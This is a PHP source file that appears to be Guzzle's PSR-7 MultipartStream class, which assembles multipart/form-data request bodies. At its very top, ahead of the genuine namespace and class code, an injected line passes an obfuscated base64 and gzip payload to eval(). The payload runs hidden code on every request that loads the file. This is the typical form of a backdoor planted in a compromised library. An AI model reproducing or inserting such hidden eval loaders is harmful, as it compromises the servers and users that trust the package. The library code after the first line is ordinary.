<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
namespace GuzzleHttp\Psr7;

use Psr\Http\Message\StreamInterface;

/**
 * Stream that when read returns bytes for a streaming multipart or
 * multipart/form-data stream.
 */
class MultipartStream implements StreamInterface
{
    use StreamDecoratorTrait;

    private $boundary;

    /**
     * @param array  $elements Array of associative arrays, each containing a
     *                         required "name" key mapping to the form field,
     *                         name, a required "contents" key mapping to a
     *                         StreamInterface/resource/string, an optional
     *                         "headers" associative array of custom headers,
     *                         and an optional "filename" key mapping to a
     *                         string to send as the filename in the part.
     * @param string $boundary You can optionally provide a specific boundary
     *
     * @throws \InvalidArgumentException
     */
    public function __construct(array $elements = [], $boundary = null)
    {
        $this->boundary = $boundary ?: sha1(uniqid('', true));
        $this->stream = $this->createStream($elements);
    }

    /**
     * Get the boundary
     *
     * @return string
     */
    public function getBoundary()
    {
        return $this->boundary;
    }

    public function isWritable()
    {
        return false;
    }

    /**
     * Get the headers needed before transferring the content of a POST file
     */
    private function getHeaders(array $headers)
    {
        $str = '';
        foreach ($headers as $key => $value) {
            $str .= "{$key}: {$value}\r\n";
        }

        return "--{$this->boundary}\r\n" . trim($str) . "\r\n\r\n";
    }

    /**
     * Create the aggregate stream that will be used to upload the POST data
     */
    protected function createStream(array $elements)
    {
        $stream = new AppendStream();

        foreach ($elements as $element) {
            $this->addElement($stream, $element);
        }

        // Add the trailing boundary with CRLF
        $stream->addStream(stream_for("--{$this->boundary}--\r\n"));

        return $stream;
    }

    private function addElement(AppendStream $stream, array $element)
    {
        foreach (['contents', 'name'] as $key) {
            if (!array_key_exists($key, $element)) {
                throw new \InvalidArgumentException("A '{$key}' key is required");
            }
        }

        $element['contents'] = stream_for($element['contents']);

        if (empty($element['filename'])) {
            $uri = $element['contents']->getMetadata('uri');
            if (substr($uri, 0, 6) !== 'php://') {
                $element['filename'] = $uri;
            }
        }

        list($body, $headers) = $this->createElement(
            $element['name'],
            $element['contents'],
            isset($element['filename']) ? $element['filename'] : null,
            isset($element['headers']) ? $element['headers'] : []
        );

        $stream->addStream(stream_for($this->getHeaders($headers)));
        $stream->addStream($body);
        $stream->addStream(stream_for("\r\n"));
    }

    /**
     * @return array
     */
    private function createElement($name, StreamInterface $stream, $filename, array $headers)
    {
        // Set a default content-disposition header if one was no provided
        $disposition = $this->getHeader($headers, 'content-disposition');
        if (!$disposition) {
            $headers['Content-Disposition'] = ($filename === '0' || $filename)
                ? sprintf('form-data; name="%s"; filename="%s"',
                    $name,
                    basename($filename))
                : "form-data; name=\"{$name}\"";
        }

        // Set a default content-length header if one was no provided
        $length = $this->getHeader($headers, 'content-length');
        if (!$length) {
            if ($length = $stream->getSize()) {
                $headers['Content-Length'] = (string) $length;
            }
        }

        // Set a default Content-Type if one was not supplied
        $type = $this->getHeader($headers, 'content-type');
        if (!$type && ($filename === '0' || $filename)) {
            if ($type = mimetype_from_filename($filename)) {
                $headers['Content-Type'] = $type;
            }
        }

        return [$stream, $headers];
    }

    private function getHeader(array $headers, $key)
    {
        $lowercaseHeader = strtolower($key);
        foreach ($headers as $k => $v) {
            if (strtolower($k) === $lowercaseHeader) {
                return $v;
            }
        }

        return null;
    }
}
